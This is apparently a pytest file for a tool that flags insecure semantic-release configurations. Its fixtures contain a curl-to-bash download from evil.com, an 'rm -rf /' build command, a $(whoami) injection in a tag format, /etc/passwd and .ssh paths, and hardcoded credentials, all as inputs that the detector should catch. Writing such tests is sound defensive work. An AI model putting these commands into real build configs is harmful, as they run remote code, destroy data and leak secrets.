"""Tests for SemanticReleaseAnalyzer."""

from pathlib import Path

from devai.semantic_release_analyzer import SemanticReleaseAnalyzer, SemanticReleaseFinding


INSECURE_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.semantic_release]
version_toml = ["../.ssh/pyproject.toml:project.version"]
dist_path = "/etc/passwd"
build_command = "curl http://evil.com/install.sh | bash"
tag_format = "v{version}-$(whoami)"
no_git_verify = true
allow_zero_version = true
upload_to_pypi = true
hvcs_token = "hardcoded-secret-token-12345"
remote = "http://user:pass@github.com/org/repo.git"
"""

HARDENED_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.semantic_release]
version_toml = ["pyproject.toml:project.version"]
build_command = "python -m build"
upload_to_pypi = false
upload_to_vcs_release = true
no_git_verify = false
allow_zero_version = false
tag_format = "v{version}"
"""

INSECURE_SEMANTIC_RELEASE_TOML = """\
[tool.semantic_release]
version_toml = ["pyproject.toml:project.version"]
build_command = "rm -rf / && python -m build"
changelog_file = "CHANGELOG.md"
remote = "http://evil.com/repo.git"
"""


class TestSemanticReleaseAnalyzer:
    def test_detects_insecure_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = SemanticReleaseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "path_traversal" in kinds
        assert "absolute_path" in kinds
        assert "dangerous_command" in kinds
        assert "tag_format_shell" in kinds
        assert "no_git_verify" in kinds
        assert "allow_zero_version" in kinds
        assert "scm_credentials" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_pyproject_clean(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = SemanticReleaseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_semantic_release_toml(self, tmp_path: Path):
        (tmp_path / "semantic_release.toml").write_text(
            INSECURE_SEMANTIC_RELEASE_TOML, encoding="utf-8"
        )
        analyzer = SemanticReleaseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "semantic_release.toml" for f in findings)
        assert any(f.kind == "insecure_http" for f in findings)
        assert any(f.kind == "dangerous_command" for f in findings)

    def test_skips_pyproject_without_semantic_release(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "example"\nversion = "0.1.0"\n',
            encoding="utf-8",
        )
        analyzer = SemanticReleaseAnalyzer(str(tmp_path))
        assert analyzer.config_files() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = SemanticReleaseAnalyzer(str(tmp_path))
        assert "Semantic-release configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Semantic-release analysis:" in ctx
        assert "findings:" in ctx

    def test_generate_hardened_template(self):
        snippet = SemanticReleaseAnalyzer(".").generate_hardened_template()
        assert "semantic_release" in snippet.lower()
        assert "upload_to_pypi = false" in snippet

    def test_finding_format(self):
        finding = SemanticReleaseFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path="pyproject.toml",
            lineno=5,
            line='token = "secret"',
        )
        assert "[high]" in finding.format()
        assert "pyproject.toml:5" in finding.format()
